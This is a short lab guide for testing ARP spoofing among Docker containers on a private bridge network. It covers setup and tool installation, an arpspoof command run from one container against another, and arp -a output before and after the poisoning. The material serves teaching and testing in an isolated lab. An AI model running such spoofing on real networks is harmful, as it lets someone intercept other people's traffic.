# How to test the arp spoofing attack

1. Create a custom network in Docker: `docker network create -d bridge mynetwork`
2. Start two or more containers and connect them to the custom network: `docker run --network mynetwork --name container1 -it ubuntu`
3. `docker run --network mynetwork --name container2 -it ubuntu`
4. `docker run --network mynetwork --name container3 -it ubuntu`
5. Once the containers are running, you can install the necessary tools like `arp`, `arp-scan`, `arp-spoof` on each of the container
   1. `apt-get update && apt-get install net-tools arp-scan`
   2. `apt-get install inetutils-ping`
   3. `apt-get install dsniff -y`
      1. only be needed in the spoofing machine ( In this case, it's a `container1` )
6. In the `container1 (172.20.0.2)`, run the command `arpspoof -i eth0 -t 172.20.0.4 172.20.0.3`
7. This will cause the `172.20.0.4` machine to send its ARP requests to `172.20.0.2` machine instead of `172.20.0.3`, so that all the traffic from `172.20.0.4` is sent to `172.20.0.2` instead of `172.20.0.3`
   1. You can get the result of ARP by using `arp -a`
    ```sh
    # When ARP spoofing is running
    $ arp -a
    container2.mynetwork (172.20.0.3) at 02:42:ac:14:00:02 [ether] on eth0
    ? (172.20.0.1) at 02:42:3c:5f:e7:08 [ether] on eth0

    # Correct ARP result
    $ arp -a
    container2.mynetwork (172.20.0.3) at 02:42:ac:14:00:03 [ether] on eth0
    ? (172.20.0.1) at 02:42:3c:5f:e7:08 [ether] on eth0
    ```
